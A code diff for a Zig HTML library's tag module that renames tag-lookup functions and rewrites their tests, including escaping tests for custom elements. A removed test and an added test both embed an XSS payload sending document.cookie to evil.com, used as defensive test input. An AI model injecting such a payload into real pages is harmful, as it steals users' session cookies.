@@ -6,74 +6,6 @@ const z = @import("../zhtml.zig");
 const testing = std.testing;
 const print = std.debug.print;
 
-/// [HtmlTag] Convert string to enum (inline) with fallback to string comparison for custom elements
-///
-/// (`Zig` code: std.meta.stringToCode` with a higher limit).
-pub fn stringToEnum(comptime T: type, str: []const u8) ?T {
-    if (@typeInfo(T).@"enum".fields.len <= 112) {
-        const kvs = comptime build_kvs: {
-            const EnumKV = struct { []const u8, T };
-            var kvs_array: [@typeInfo(T).@"enum".fields.len]EnumKV = undefined;
-            for (@typeInfo(T).@"enum".fields, 0..) |enumField, i| {
-                kvs_array[i] = .{ enumField.name, @field(T, enumField.name) };
-            }
-            break :build_kvs kvs_array[0..];
-        };
-        const map = std.StaticStringMap(T).initComptime(kvs);
-        return map.get(str);
-    } else {
-        inline for (@typeInfo(T).@"enum".fields) |enumField| {
-            if (std.mem.eql(u8, str, enumField.name)) {
-                return @field(T, enumField.name);
-            }
-        }
-        return null;
-    }
-}
-
-/// [HtmlTag] Convert qualified name (lowercase) to HtmlTag enum (inline)
-pub inline fn parseTag(qualified_name: []const u8) ?HtmlTag {
-    // Fast path: try direct enum lookup (most common case - lowercase)
-    if (stringToEnum(HtmlTag, qualified_name)) |tag| {
-        return tag;
-    }
-
-    // Handle case-insensitive lookup for uppercase tags
-    var lowercase_buf: [64]u8 = undefined;
-    if (qualified_name.len >= lowercase_buf.len) return null; // Tag name too long
-
-    const lowercase_name = std.ascii.lowerString(lowercase_buf[0..qualified_name.len], qualified_name);
-    if (stringToEnum(HtmlTag, lowercase_name)) |tag| {
-        return tag;
-    }
-
-    // Handle namespaced elements: "svg:circle" -> null (not in our enum)
-    if (std.mem.indexOf(u8, qualified_name, ":")) |_| {
-        return null; // Namespaced elements not in standard HTML enum
-    }
-
-    return null; // Unknown/custom element
-}
-
-test "parseTag" {
-    try testing.expect(parseTag("div") == .div);
-    try testing.expect(parseTag("span") == .span);
-    try testing.expect(parseTag("SPAN") == .span);
-    try testing.expect(parseTag("unknown") == null);
-}
-
-/// [HtmlTag] Convert element to HtmlTag enum (inline)
-pub fn tagFromElement(element: *z.HTMLElement) ?HtmlTag {
-    const qualified_name = z.qualifiedName_zc(element);
-    return parseTag(qualified_name);
-}
-
-/// [HtmlTag] Tag name matcher function
-pub fn matchesTagName(element: *z.HTMLElement, tag_name: []const u8) bool {
-    const tag = z.parseTag(z.qualifiedName_zc(element));
-    return tag == parseTag(tag_name);
-}
-
 /// [HtmlTag] Enum that represents the various HTML tags.
 ///
 ///  `self.toString` returns the tag name as a string.
@@ -311,6 +243,7 @@ pub const HtmlTag = enum {
         };
     }
 
+    /// Check if this tag is a void  element
     pub fn isVoid(self: HtmlTag) bool {
         return VoidTagSet.contains(self);
     }
@@ -320,6 +253,291 @@ pub const HtmlTag = enum {
         return NoEscapeTagSet.contains(self);
     }
 };
+
+/// [HtmlTag] Convert string to enum (inline) with fallback to string comparison for custom elements
+///
+/// (`Zig` code: std.meta.stringToCode` with a higher limit).
+pub fn stringToEnum(comptime T: type, str: []const u8) ?T {
+    if (@typeInfo(T).@"enum".fields.len <= 112) {
+        const kvs = comptime build_kvs: {
+            const EnumKV = struct { []const u8, T };
+            var kvs_array: [@typeInfo(T).@"enum".fields.len]EnumKV = undefined;
+            for (@typeInfo(T).@"enum".fields, 0..) |enumField, i| {
+                kvs_array[i] = .{ enumField.name, @field(T, enumField.name) };
+            }
+            break :build_kvs kvs_array[0..];
+        };
+        const map = std.StaticStringMap(T).initComptime(kvs);
+        return map.get(str);
+    } else {
+        inline for (@typeInfo(T).@"enum".fields) |enumField| {
+            if (std.mem.eql(u8, str, enumField.name)) {
+                return @field(T, enumField.name);
+            }
+        }
+        return null;
+    }
+}
+
+/// [HtmlTag] Convert qualified name (lowercase) to HtmlTag enum (inline)
+pub inline fn tagFromQualifiedName(qualified_name: []const u8) ?HtmlTag {
+    // Fast path: try direct enum lookup (most common case - lowercase)
+    if (stringToEnum(HtmlTag, qualified_name)) |tag| {
+        return tag;
+    }
+
+    // Handle case-insensitive lookup for uppercase tags
+    var lowercase_buf: [64]u8 = undefined;
+    if (qualified_name.len >= lowercase_buf.len) return null; // Tag name too long
+
+    const lowercase_name = std.ascii.lowerString(lowercase_buf[0..qualified_name.len], qualified_name);
+    if (stringToEnum(HtmlTag, lowercase_name)) |tag| {
+        return tag;
+    }
+
+    // Handle namespaced elements: "svg:circle" -> null (not in our enum)
+    if (std.mem.indexOf(u8, qualified_name, ":")) |_| {
+        return null; // Namespaced elements not in standard HTML enum
+    }
+
+    return null; // Unknown/custom element
+}
+
+test "tagFromQualifiedName" {
+    try testing.expect(tagFromQualifiedName("div") == .div);
+    try testing.expect(tagFromQualifiedName("span") == .span);
+    try testing.expect(tagFromQualifiedName("SPAN") == .span);
+    try testing.expect(tagFromQualifiedName("unknown") == null);
+    try testing.expect(tagFromQualifiedName("custom-element") == null);
+    // namespaced
+    try testing.expect(tagFromQualifiedName("svg:circle") == null);
+}
+
+/// [HtmlTag] Convert element to HtmlTag enum (inline)
+pub fn tagFromElement(element: *z.HTMLElement) ?HtmlTag {
+    const qualified_name = z.qualifiedName_zc(element);
+    return tagFromQualifiedName(qualified_name);
+}
+
+test "self.toString vs tagFromQualifiedName, self.isVoid, self.isNoEscape" {
+    const doc = try z.createDocument();
+    defer z.destroyDocument(doc);
+
+    const tags = [_]z.HtmlTag{ .div, .p, .span, .a, .img, .br, .script };
+
+    for (tags) |tag| {
+        const element = try z.createElement(doc, tag.toString());
+        const node_name = z.nodeName_zc(z.elementToNode(element)); // UPPERCASE
+        const expected_Html_tag_name = tag.toString();
+
+        try testing.expect(tag == z.tagFromElement(element).?);
+
+        if (tag == .br or tag == .img) {
+            try testing.expect(tag.isVoid());
+        } else if (tag == .script) {
+            try testing.expect(!tag.isVoid());
+            try testing.expect(tag.isNoEscape());
+        } else {
+            try testing.expect(!tag.isVoid());
+            try testing.expect(!tag.isNoEscape());
+        }
+
+        // Note: DOM names are typically uppercase
+        try testing.expect(std.ascii.eqlIgnoreCase(expected_Html_tag_name, node_name));
+
+        const expected_tag = tagFromQualifiedName(z.qualifiedName_zc(element)); // lowercase
+        try testing.expect(tag == expected_tag);
+    }
+}
+
+/// [HtmlTag] Tag name matcher function
+pub fn matchesTagName(element: *z.HTMLElement, tag_name: []const u8) bool {
+    const tag = z.tagFromElement(element);
+    return tag == tagFromQualifiedName(tag_name);
+}
+
+test "matchesTagName" {
+    const doc = try z.parseFromString("<p></p><br>");
+    const body_elt = try z.bodyElement(doc);
+    const p = z.firstElementChild(body_elt).?;
+    const br = z.nextElementSibling(p).?;
+
+    try testing.expect(z.matchesTagName(p, "p"));
+    try testing.expect(!z.matchesTagName(br, "td"));
+}
+
+/// [HtmlTag] Set of void elements
+pub const VoidTagSet = struct {
+    /// Fast inline check if a tag is void
+    pub inline fn contains(tag: HtmlTag) bool {
+        return switch (tag) {
+            .area, .base, .br, .col, .embed, .hr, .img, .input, .link, .meta, .source, .track, .wbr => true,
+            else => false,
+        };
+    }
+};
+
+test "VoidTagSet" {
+    try testing.expect(VoidTagSet.contains(.br));
+    try testing.expect(VoidTagSet.contains(.img));
+    try testing.expect(VoidTagSet.contains(.input));
+    try testing.expect(!VoidTagSet.contains(.div));
+}
+
+/// [HtmlTag] Set of whitespace preserved elements
+pub const WhitespacePreserveTagSet = struct {
+    /// Fast inline check if a tag is whitespace preserved
+    pub inline fn contains(tag: HtmlTag) bool {
+        return switch (tag) {
+            .pre, .textarea, .script, .style => true,
+            .code => true,
+            else => false,
+        };
+    }
+};
+
+test "whitespacepreservedTagSet" {
+    const allocator = testing.allocator;
+
+    const doc = try z.parseFromString("<div></div><pre></pre><code></code><textarea></textarea><script></script><style></style><p></p>");
+    defer z.destroyDocument(doc);
+
+    const body_elt = try z.bodyElement(doc);
+
+    const expected = [_]struct { tag: z.HtmlTag, preserved: bool }{
+        .{ .tag = .div, .preserved = false },
+        .{ .tag = .pre, .preserved = true },
+        .{ .tag = .code, .preserved = true },
+        .{ .tag = .textarea, .preserved = true },
+        .{ .tag = .script, .preserved = true },
+        .{ .tag = .style, .preserved = true },
+        .{ .tag = .p, .preserved = false },
+    };
+
+    const children_elts = try z.children(allocator, body_elt);
+    defer allocator.free(children_elts);
+
+    for (children_elts, 0..) |elt, i| {
+        const tag = z.tagFromQualifiedName(z.qualifiedName_zc(elt)).?;
+        try testing.expect(expected[i].tag == tag);
+        try testing.expect(expected[i].preserved == WhitespacePreserveTagSet.contains(tag));
+    }
+}
+
+/// [HtmlTag] Set of tags that should not be escaped (modern approach)
+pub const NoEscapeTagSet = struct {
+    /// Fast inline check if a tag should not be escaped
+    pub inline fn contains(tag: HtmlTag) bool {
+        return switch (tag) {
+            .script, .style, .iframe => true,
+            else => false,
+        };
+    }
+};
+
+/// [HtmlTag] Check if element should not have its content escaped (string-based)
+///
+/// Only standard tags get `isNoEscape = true` (`.script`, `.style`, `.iframe`).
+///
+/// If returns false, it means the element is not a no-escape element so it should be escaped.
+///
+/// Same content "<script>alert('xss')</script>", different contexts:
+///   1. Inside `<my-widget>`: ESCAPE, treat as text     → Safe display
+///   2. Inside `<script>`: DON'T ESCAPE, treat as code  → Functional JavaScript
+/// ## Example
+/// ```
+/// <my-widget>User typed: <script>alert('xss')</script></my-widget>
+/// // should become:
+/// <my-widget>&lt;script&gt;alert('xss')&lt;/script&gt;</my-widget>
+/// //
+/// <script>console.log("hello");</script>  ← Must NOT escape
+/// <style>body { color: red; }</style>     ← Must NOT escape
+/// <iframe src="..."></iframe>             ← Must NOT escape
+///---
+pub fn isNoEscapeElement(element: *z.HTMLElement) bool {
+    const tag = tagFromElement(element) orelse return false;
+    return NoEscapeTagSet.contains(tag);
+}
+
+/// [HtmlTag] Check if element is void
+pub fn isVoidElement(element: *z.HTMLElement) bool {
+    const tag = tagFromElement(element) orelse return false;
+    return VoidTagSet.contains(tag);
+}
+
+test "isVoidElement" {
+    const allocator = testing.allocator;
+    const doc = try z.parseFromString("<br><img src=\"img\"><input><p></p>");
+    defer z.destroyDocument(doc);
+
+    const body_elt = try z.bodyElement(doc);
+
+    const expected = [_]struct { tag: z.HtmlTag, void: bool }{
+        .{ .tag = .br, .void = true },
+        .{ .tag = .img, .void = true },
+        .{ .tag = .input, .void = true },
+        .{ .tag = .p, .void = false },
+    };
+
+    const children_elts = try z.children(allocator, body_elt);
+    defer allocator.free(children_elts);
+
+    for (children_elts, 0..) |elt, i| {
+        const tag = z.tagFromElement(elt).?;
+        try testing.expect(expected[i].tag == tag);
+        try testing.expect(expected[i].void == isVoidElement(elt));
+    }
+}
+
+/// [HtmlTag] Check if the string (lowercased) represents  a Void element
+pub fn isVoidName(tag_name: []const u8) bool {
+    const tag = stringToEnum(HtmlTag, tag_name) orelse return false;
+    return VoidTagSet.contains(tag);
+}
+
+test "isVoidName" {
+    // Test all void tags
+    const void_tags = [_][]const u8{ "area", "base", "br" };
+
+    for (void_tags) |tag| {
+        try testing.expect(z.isVoidName(tag));
+    }
+
+    const non_void_tags = [_][]const u8{ "div", "p", "span", "a" };
+
+    for (non_void_tags) |tag| {
+        try testing.expect(!z.isVoidName(tag));
+    }
+}
+
+/// [HtmlTag] Extended check for no-escape elements including custom elements
+///
+/// Combines standard HTML5 tags with your custom no-escape tags.
+///
+/// **Use when:** You have web components that contain raw code (like code editors)
+/// **Performance:** Fast for standard tags (enum), linear search for custom tags
+///
+/// ```zig
+/// const custom_no_escape = [_][]const u8{ "code-editor", "syntax-highlighter" };
+/// if (isNoEscapeElementExtended(tag_name, &custom_no_escape)) {
+///     // Don't escape content
+/// }
+/// ```
+pub fn isNoEscapeElementExtended(element: *z.HTMLElement, custom_no_escape_tags: []const []const u8) bool {
+    // First check standard HTML5 tags
+    if (isNoEscapeElement(element)) {
+        return true;
+    }
+
+    // Then check custom tags
+    for (custom_no_escape_tags) |custom_tag| {
+        if (std.mem.eql(u8, z.qualifiedName_zc(element), custom_tag)) {
+            return true;
+        }
+    }
+
+    return false;
+}
 
 /// [HtmlTag] Fragment parsing context - defines how the fragment should be interpreted
 pub const FragmentContext = enum {
@@ -405,469 +623,70 @@ test "FragmentContext" {
     try testing.expect(FragmentContext.toTag("div").? == .div);
 }
 
-/// [HtmlTag] Set of void elements
-pub const VoidTagSet = struct {
-    /// Fast inline check if a tag is void
-    pub inline fn contains(tag: HtmlTag) bool {
-        return switch (tag) {
-            .area, .base, .br, .col, .embed, .hr, .img, .input, .link, .meta, .source, .track, .wbr => true,
-            else => false,
-        };
-    }
-};
-
-test "VoidTagSet" {
-    try testing.expect(VoidTagSet.contains(.br));
-    try testing.expect(VoidTagSet.contains(.img));
-    try testing.expect(VoidTagSet.contains(.input));
-    try testing.expect(!VoidTagSet.contains(.div));
-}
-
-/// [HtmlTag] Set of whitespace preserved elements
-pub const WhitespacePreserveTagSet = struct {
-    /// Fast inline check if a tag is whitespace preserved
-    pub inline fn contains(tag: HtmlTag) bool {
-        return switch (tag) {
-            .pre, .textarea, .script, .style => true,
-            .code => true,
-            else => false,
-        };
-    }
-};
-
-test "whitespacepreservedTagSet" {
-    const allocator = testing.allocator;
-
-    const doc = try z.parseFromString("<div></div><pre></pre><code></code><textarea></textarea><script></script><style></style><p></p>");
-    defer z.destroyDocument(doc);
-
-    const body_elt = try z.bodyElement(doc);
-
-    const expected = [_]struct { tag: z.HtmlTag, preserved: bool }{
-        .{ .tag = .div, .preserved = false },
-        .{ .tag = .pre, .preserved = true },
-        .{ .tag = .code, .preserved = true },
-        .{ .tag = .textarea, .preserved = true },
-        .{ .tag = .script, .preserved = true },
-        .{ .tag = .style, .preserved = true },
-        .{ .tag = .p, .preserved = false },
-    };
-
-    const children_elts = try z.children(allocator, body_elt);
-    defer allocator.free(children_elts);
-
-    for (children_elts, 0..) |elt, i| {
-        const tag = z.parseTag(z.qualifiedName_zc(elt)).?;
-        try testing.expect(expected[i].tag == tag);
-        try testing.expect(expected[i].preserved == WhitespacePreserveTagSet.contains(tag));
-    }
-}
-
-/// [HtmlTag] Set of tags that should not be escaped (modern approach)
-pub const NoEscapeTagSet = struct {
-    /// Fast inline check if a tag should not be escaped
-    pub inline fn contains(tag: HtmlTag) bool {
-        return switch (tag) {
-            .script, .style, .iframe => true,
-            else => false,
-        };
-    }
-};
-
-/// [HtmlTag] Fast check if element should not have its content escaped (string-based)
-///
-/// Uses qualified name string and enum-based lookup for maximum performance.
-/// For direct element checking without string allocation, use isNoEscapeElementFastZeroCopy().
-///
-/// Only standard tags get `isNoEscape = true` (`.script`, `.style`, `.iframe`).
-///
-/// If returns false, it means the element is not a no-escape element so it should be escaped.
-/// ## Example
-/// ```
-/// <my-widget>User typed: <script>alert('xss')</script></my-widget>
-/// // becomes
-/// <my-widget>&lt;script&gt;alert('xss')&lt;/script&gt;</my-widget>
-/// //
-/// <script>console.log("hello");</script>  ← Must NOT escape
-/// <style>body { color: red; }</style>     ← Must NOT escape
-/// <iframe src="..."></iframe>             ← Must NOT escape
-///---
-pub fn isNoEscapeElement(element: *z.HTMLElement) bool {
-    const tag = tagFromElement(element) orelse return false;
-    return NoEscapeTagSet.contains(tag);
-}
-
-/// [HtmlTag] Fast check if element is void/self-closing (string-based)
-///
-/// Uses qualified name string and enum-based lookup for maximum performance.
-/// For direct element checking without string allocation, use isVoidElementFastZeroCopy().
-///
-/// **Use when:** You already have the qualified name string
-/// **Performance:** Fast (enum lookup), requires qualified name parameter
-pub fn isVoidElement(qualified_name: []const u8) bool {
-    const tag = parseTag(qualified_name) orelse return false;
-    return VoidTagSet.contains(tag);
-}
-
-// /// [HtmlTag] ZERO-COPY void element check using lexbor's memory directly
-// ///
-// /// **Most performant version** - no allocation, direct from lexbor's memory
-// ///
-// /// **Use when:** You have the element object and need immediate checking
-// /// **Performance:** Fastest (no string allocation), but element must be valid
-// ///
-// /// ```zig
-// /// if (isVoidElementFastZeroCopy(element)) {
-// ///     // Handle void element (like <br>, <img>)
-// /// }
-// /// ```
-pub fn isVoidTag(tag: z.HtmlTag) bool {
-    return VoidTagSet.contains(tag);
-}
-
-/// [HtmlTag] Extended check for no-escape elements including custom elements
-///
-/// Combines standard HTML5 tags with your custom no-escape tags.
-///
-/// **Use when:** You have web components that contain raw code (like code editors)
-/// **Performance:** Fast for standard tags (enum), linear search for custom tags
-///
-/// ```zig
-/// const custom_no_escape = [_][]const u8{ "code-editor", "syntax-highlighter" };
-/// if (isNoEscapeElementExtended(tag_name, &custom_no_escape)) {
-///     // Don't escape content
-/// }
-/// ```
-pub fn isNoEscapeElementExtended(element: *z.HTMLElement, custom_no_escape_tags: []const []const u8) bool {
-    // First check standard HTML5 tags
-    if (isNoEscapeElement(element)) {
-        return true;
-    }
-
-    // Then check custom tags
-    for (custom_no_escape_tags) |custom_tag| {
-        if (std.mem.eql(u8, z.qualifiedName_zc(element), custom_tag)) {
-            return true;
-        }
-    }
-
-    return false;
-}
-// =================================================================
-// === Tests ===
-
-test "parseTag enum conversion" {
-    // Test standard HTML tags
-    try testing.expect(parseTag("div").? == HtmlTag.div);
-    try testing.expect(parseTag("p").? == HtmlTag.p);
-    try testing.expect(parseTag("script").? == HtmlTag.script);
-
-    // Test custom elements
-    try testing.expect(parseTag("custom-element") == null);
-    try testing.expect(parseTag("my-widget") == null);
-
-    // Test namespaced elements
-    try testing.expect(parseTag("svg:circle") == null);
-    try testing.expect(parseTag("math:equation") == null);
-}
-
-// test "custom elements and web components" {
-//     // Standard HTML5 elements
-//     try testing.expect(isVoidElementFast("br") == true);
-//     try testing.expect(isNoEscapeElement("script") == true);
-
-//     // Custom elements/Web components (safe defaults)
-//     try testing.expect(isVoidElementFast("my-widget") == false); // Not void
-//     try testing.expect(isNoEscapeElement("my-widget") == false); // DO escape (safer)
-//     try testing.expect(isVoidElementFast("custom-button") == false);
-//     try testing.expect(isNoEscapeElement("custom-button") == false);
-
-//     // Web component naming conventions
-//     try testing.expect(isVoidElementFast("x-calendar") == false);
-//     try testing.expect(isNoEscapeElement("x-calendar") == false);
-
-//     // Extended function with custom no-escape tags
-//     const custom_no_escape = [_][]const u8{ "code-editor", "syntax-highlighter" };
-//     try testing.expect(isNoEscapeElementExtended("script", &custom_no_escape) == true); // Standard
-//     try testing.expect(isNoEscapeElementExtended("code-editor", &custom_no_escape) == true); // Custom
-//     try testing.expect(isNoEscapeElementExtended("my-widget", &custom_no_escape) == false); // Regular custom
-// }
-
-// test "FAST enum-based functions" {
-//     // Test the FAST enum-based functions
-//     try testing.expect(isVoidElementFast("br") == true);
-//     try testing.expect(isVoidElementFast("img") == true);
-//     try testing.expect(isVoidElementFast("div") == false);
-
-//     try testing.expect(isNoEscapeElement("script") == true);
-//     try testing.expect(isNoEscapeElement("style") == true);
-//     try testing.expect(isNoEscapeElement("div") == false);
-
-//     // Test case insensitivity
-//     try testing.expect(isVoidElementFast("BR") == true);
-//     try testing.expect(isVoidElementFast("IMG") == true);
-//     try testing.expect(isNoEscapeElement("SCRIPT") == true);
-
-//     // Fast version doesn't handle obsolete tags (returns false)
-//     try testing.expect(isNoEscapeElement("xmp") == false); // Not in HTML5 enum
-// }
-
-// test "ZERO-COPY element functions" {
-//     const doc = try z.createDocument();
-//     defer z.destroyDocument(doc);
-
-//     // Create test elements
-//     const br_elem = try z.createElement(doc, "br");
-//     const script_elem = try z.createElement(doc, "script");
-//     const div_elem = try z.createElement(doc, "div");
-//     const custom_elem = try z.createElement(doc, "my-widget");
-
-//     // Test zero-copy void element checks
-//     try testing.expect(isVoidElementFastZeroCopy(br_elem) == true);
-//     try testing.expect(isVoidElementFastZeroCopy(div_elem) == false);
-//     try testing.expect(isVoidElementFastZeroCopy(custom_elem) == false); // Custom elements are not void
-
-//     // Test zero-copy no-escape checks
-//     try testing.expect(isNoEscapeElement(script_elem) == true);
-//     try testing.expect(isNoEscapeElement(div_elem) == false);
-//     try testing.expect(isNoEscapeElement(custom_elem) == false); // Custom elements are escaped by default
-// }
-
-test "parseHtmlTag" {
-    const good_tag = parseTag("div");
-    try testing.expect(good_tag.? == HtmlTag.div);
-
-    const custom_tag = parseTag("custom-element");
-    try testing.expect(custom_tag == null);
-}
-
-test "isVoid tag" {
+test "tagFromElement vs tagName vs qualifiedName allocated/zc" {
     const doc = try z.createDocument();
     defer z.destroyDocument(doc);
 
-    // Test all void tags
-    const void_tags = [_]HtmlTag{ .area, .base, .br };
+    const div = try z.createElement(doc, "div");
+    const web_component = try z.createElement(doc, "x-widget");
 
-    for (void_tags) |tag| {
-        try testing.expect(tag.isVoid());
-    }
-
-    const non_void_tags = [_]HtmlTag{ .div, .p, .span, .a };
-
-    for (non_void_tags) |tag| {
-        try testing.expect(!tag.isVoid());
-    }
-}
-
-// test "isVoidElementFast with various tags" {
-//     // Test the updated isVoidElementFast function
-//     try testing.expect(isVoidElementFast("br") == true);
-//     try testing.expect(isVoidElementFast("img") == true);
-//     try testing.expect(isVoidElementFast("div") == false);
-//     try testing.expect(isVoidElementFast("custom-element") == false);
-//     try testing.expect(isVoidElementFast("BR") == true); // Case insensitive
-//     try testing.expect(isVoidElementFast("IMG") == true);
-// }
-test "lexbor NODENAME and self.toString and parseTag and qualifiedName" {
-    const doc = try z.createDocument();
-    defer z.destroyDocument(doc);
-
-    // Test all enum variants work
-    const tags = [_]z.HtmlTag{ .div, .p, .span, .a, .img, .br };
-
-    for (tags) |tag| {
-        const element = try z.createElementAttr(doc, tag.toString(), &.{});
-        const node_name = z.nodeName_zc(z.elementToNode(element));
-        const expected_name = tag.toString();
-
-        // Note: DOM names are typically uppercase
-        try testing.expect(std.ascii.eqlIgnoreCase(expected_name, node_name));
-
-        const expected_tag = parseTag(z.qualifiedName_zc(element));
-        try testing.expect(tag == expected_tag);
-    }
-}
-
-// test "custom element with script content - security behavior" {
-//     const allocator = testing.allocator;
-
-//     // Parse the potentially dangerous HTML
-//     const html = "<my-widget><script>alert('xss')</script></my-widget>";
-//     const doc = try z.parseFromString(html);
-//     defer z.destroyDocument(doc);
-
-//     // Get the my-widget element
-//     const body = try z.bodyElement(doc);
-//     const body_node = z.elementToNode(body);
-//     const my_widget_node = z.firstChild(body_node).?;
-//     const my_widget = z.nodeToElement(my_widget_node).?;
-
-//     // Verify it's a custom element (not in enum)
-//     try testing.expectEqualStrings("my-widget", z.qualifiedName_zc(my_widget));
-//     try testing.expect(parseTag("my-widget") == null); // Not in enum
-
-//     // Check security defaults for custom elements
-//     try testing.expect(isVoidElementFastZeroCopy(my_widget) == false); // Not void
-//     try testing.expect(isNoEscapeElement(my_widget) == false); // SHOULD escape content
-
-//     // Get the inner script element
-//     const script_node = z.firstChild(z.elementToNode(my_widget)).?;
-//     const script_element = z.nodeToElement(script_node).?;
-
-//     // Verify the script element itself
-//     try testing.expectEqualStrings("script", z.qualifiedName_zc(script_element));
-//     try testing.expect(parseTag("script").? == HtmlTag.script); // IS in enum
-//     try testing.expect(isNoEscapeElement(script_element) == true); // Script content should NOT be escaped
-
-//     // Get the actual text content
-//     const script_content = try z.textContent(allocator, script_node);
-//     defer allocator.free(script_content);
-//     try testing.expectEqualStrings("alert('xss')", script_content);
-
-//     // ================================================================
-//     // DEMONSTRATE THE COMPLETE SECURITY FLOW
-//     // ================================================================
-
-//     // Phase 1: HTML → DOM (already done above)
-//     // ✅ Parsed successfully, scripts don't execute in Zig
-
-//     // Phase 2: Optional DOM normalization (simulate with cleaner-like behavior)
-//     // ✅ Structure is fine, no normalization needed for this test
-
-//     // Phase 3: DOM → HTML serialization (THE CRITICAL SECURITY PHASE)
-//     // This is where your enum system provides security guidance:
-
-//     // SAFE SERIALIZATION: Custom element content should be escaped
-//     const my_widget_content = try z.textContent(allocator, z.elementToNode(my_widget));
-//     defer allocator.free(my_widget_content);
-
-//     // Simulate how a serializer would use your enum system for security:
-//     if (isNoEscapeElement(my_widget) == false) {
-//         // ✅ SAFE: Custom element content should be escaped when serializing
-//         // This would turn: <script>alert('xss')</script>
-//         // Into: &lt;script&gt;alert('xss')&lt;/script&gt;
-//         try testing.expect(std.mem.indexOf(u8, my_widget_content, "alert('xss')") != null);
-//         // Note: In real serialization, this content would be HTML-escaped
-//     }
-
-//     // FUNCTIONAL SERIALIZATION: Script element content should NOT be escaped
-//     if (isNoEscapeElement(script_element) == true) {
-//         // ✅ FUNCTIONAL: Script content needs raw JavaScript to work
-//         // This preserves: alert('xss'); (so JavaScript can execute properly)
-//         try testing.expect(std.mem.indexOf(u8, script_content, "alert('xss')") != null);
-//     }
-
-//     // ================================================================
-//     // THE KEY INSIGHT: Context determines security
-//     // ================================================================
-
-//     // Same content "<script>alert('xss')</script>", different contexts:
-//     // 1. Inside <my-widget>: ESCAPE (treat as text)     → Safe display
-//     // 2. Inside <script>: DON'T ESCAPE (treat as code)  → Functional JavaScript
-
-//     // Your enum system provides the context-aware security rules!
-
-//     // SUMMARY:
-//     // - DOM parsing: Safe in Zig (scripts don't execute)
-//     // - DOM normalization: No escaping needed (already parsed)
-//     // - DOM serialization: Critical security phase (use your enum guidance)
-//     // - Browser consumption: Where the actual danger lies
-// }
-
-test "complete security flow - user input to browser output" {
-    const allocator = testing.allocator;
-
-    // ================================================================
-    // REAL-WORLD SCENARIO: User submits dangerous content
-    // ================================================================
-
-    const user_submitted_html = "<my-custom-widget><script>document.location = 'https://evil.com?data=' + document.cookie;</script><p>Innocent content</p></my-custom-widget>";
-
-    // Phase 1: Parse user content (safe in Zig server environment)
-    const doc = try z.parseFromString(user_submitted_html);
-    defer z.destroyDocument(doc);
-
-    const body = try z.bodyElement(doc);
-    const widget = z.firstChild(z.elementToNode(body)).?;
-    const widget_element = z.nodeToElement(widget).?;
-
-    // Verify we have a custom element
-    try testing.expectEqualStrings("my-custom-widget", z.qualifiedName_zc(widget_element));
-    try testing.expect(parseTag("my-custom-widget") == null); // Not in standard HTML enum
-
-    // Phase 2: Check security guidance from your enum system
-    const should_escape_widget = !isNoEscapeElement(widget_element);
-    try testing.expect(should_escape_widget == true); // Custom elements should be escaped
-
-    // Phase 3: Simulate safe serialization for browser output
-    const widget_content = try z.textContent(allocator, widget);
-    defer allocator.free(widget_content);
-
-    // This content contains dangerous JavaScript
-    try testing.expect(std.mem.indexOf(u8, widget_content, "document.cookie") != null);
-    try testing.expect(std.mem.indexOf(u8, widget_content, "evil.com") != null);
-
-    // ✅ SAFE OUTPUT: Because isNoEscape = false for custom elements,
-    // a proper serializer would escape this content:
-    //
-    // DANGEROUS (raw):
-    // <my-custom-widget><script>document.location='https://evil.com'</script></my-custom-widget>
-    //
-    // SAFE (escaped):
-    // <my-custom-widget>&lt;script&gt;document.location='https://evil.com'&lt;/script&gt;</my-custom-widget>
-    //
-    // When sent to browser: JavaScript becomes harmless text!
-
-    // Your enum system provides the critical security guidance:
-    // - Standard HTML elements: Functional (scripts can execute)
-    // - Custom elements: Safe (content gets escaped)
-    // - Unknown elements: Safe by default (fallback to escaping)
-
-    // This prevents XSS while maintaining HTML functionality! 🛡️
-}
-test "mixing enum and string creation" {
-    const doc = try z.createDocument();
-    defer z.destroyDocument(doc);
-
-    const div = try z.createElementAttr(
-        doc,
-        "div",
-        &.{},
-    );
-
-    const custom = try z.createElementAttr(
-        doc,
-        "my-custom-element",
-        &.{},
-    );
-    const web_component = try z.createElementAttr(
-        doc,
-        "x-widget",
-        &.{},
-    );
+    try testing.expect(z.tagFromElement(web_component) == null);
+    try testing.expect(z.tagFromElement(div) == .div);
 
     try testing.expectEqualStrings("DIV", z.nodeName_zc(z.elementToNode(div)));
-    try testing.expectEqualStrings("MY-CUSTOM-ELEMENT", z.nodeName_zc(z.elementToNode(custom)));
     try testing.expectEqualStrings("X-WIDGET", z.nodeName_zc(z.elementToNode(web_component)));
     try testing.expectEqualStrings("DIV", z.tagName_zc(div));
-    try testing.expectEqualStrings("MY-CUSTOM-ELEMENT", z.tagName_zc(custom));
     try testing.expectEqualStrings("X-WIDGET", z.tagName_zc(web_component));
 
-    // Test both allocation and zero-copy versions
+    // Test allocation
     const allocator = testing.allocator;
 
     // Allocating version (safe for long-term storage)
-    const qcustom = try z.qualifiedName(allocator, custom);
-    defer allocator.free(qcustom);
-    try testing.expectEqualStrings("my-custom-element", qcustom);
+    const wc_qn = try z.qualifiedName(allocator, web_component);
+    defer allocator.free(wc_qn);
+    try testing.expectEqualStrings("x-widget", wc_qn);
 
-    const qdiv = try z.qualifiedName(allocator, div);
-    defer allocator.free(qdiv);
-    try testing.expectEqualStrings("div", qdiv);
+    const div_tn = try z.tagName(allocator, div);
+    defer allocator.free(div_tn);
+    try testing.expectEqualStrings("DIV", div_tn);
 
-    // Zero-copy version (fast, but only valid during element lifetime)
-    const qcustom_borrowed = z.qualifiedName_zc(custom);
-    const qdiv_borrowed = z.qualifiedName_zc(div);
-    try testing.expectEqualStrings("my-custom-element", qcustom_borrowed);
-    try testing.expectEqualStrings("div", qdiv_borrowed);
+    const wc_tn = try z.tagName(allocator, web_component);
+    defer allocator.free(wc_tn);
+    try testing.expectEqualStrings("X-WIDGET", wc_tn);
+}
+
+test "flow - user input to browser output" {
+    const user_submitted_html = "<custom-widget><script>document.location = 'https://evil.com?data=' + document.cookie;</script></custom-widget>";
+    const doc = try z.parseFromString(user_submitted_html);
+    defer z.destroyDocument(doc);
+
+    const body_elt = try z.bodyElement(doc);
+    const widget_elt = z.firstElementChild(body_elt).?;
+
+    // custom element <=> not in standard HTML enum
+    try testing.expectEqualStrings("custom-widget", z.qualifiedName_zc(widget_elt));
+    try testing.expect(z.tagFromQualifiedName("custom-widget") == null);
+
+    // Custom elements should be escaped
+    const should_escape_widget = !z.isNoEscapeElement(widget_elt);
+    try testing.expect(should_escape_widget == true);
+
+    const widget_content = z.textContent_zc(z.elementToNode(widget_elt));
